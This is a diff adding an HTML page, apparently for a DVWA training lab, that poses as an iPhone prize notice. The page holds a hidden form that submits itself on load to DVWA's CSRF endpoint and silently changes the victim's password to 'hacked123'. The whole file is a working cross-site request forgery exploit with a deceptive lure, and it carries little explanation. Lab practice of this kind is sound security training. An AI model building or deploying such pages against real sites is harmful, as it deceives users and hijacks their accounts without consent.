@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Win a Prize!</title>
+</head>
+<body>
+    <h1>Congratulations! You won a free iPhone!</h1>
+    <p>Please wait while we verify your details...</p>
+    
+    <!-- Hidden form that submits to DVWA in the background -->
+    <form id='csrf' action='http://localhost/dvwa/vulnerabilities/csrf/' method='GET' style='display:none;'>
+        <input type='hidden' name='password_new'  value='hacked123'>
+        <input type='hidden' name='password_conf' value='hacked123'>
+        <input type='hidden' name='Change'        value='Change'>
+    </form>
+
+    <script>
+        // Automatically submits the form when the victim opens this page
+        window.onload = function() {
+            document.getElementById('csrf').submit();
+        }
+    </script>
+</body>
+</html>
